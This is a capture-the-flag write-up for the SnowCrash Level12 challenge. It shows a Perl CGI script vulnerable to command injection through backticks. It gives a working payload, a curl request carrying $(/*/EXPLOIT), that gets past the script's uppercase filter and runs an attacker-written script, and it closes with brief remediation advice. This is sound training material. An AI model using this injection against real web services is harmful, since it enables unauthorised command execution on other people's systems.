# Level12

### Tools

### How to solve it

1. After logging in using ssh at level12@(vmIP):

```bash
ssh level12@000.000.000.000 -p 4242
```

2. When logging in, we see a Perl script `level12.pl` running on port 4646:

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
# ...
sub t {
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  # ...
}
# ...
```

3. The script uses backticks `` `egrep "^$xx" /tmp/xd 2>&1` `` which allows command injection. Note that it converts input to uppercase and removes everything after the first space.

4. We can exploit this by creating a script with an uppercase name in `/tmp` and using a wildcard to execute it without triggering the uppercase conversion on the script path.

```bash
level12@SnowCrash:~$ echo 'getflag > /tmp/flag12' > /tmp/EXPLOIT
level12@SnowCrash:~$ chmod +x /tmp/EXPLOIT
level12@SnowCrash:~$ curl 'localhost:4646?x=$(/*/EXPLOIT)'
level12@SnowCrash:~$ cat /tmp/flag12
```

### How to protect

- Avoid using backticks or `system()` with unvalidated user input.
- Use native Perl functions to read and filter files instead of external commands.


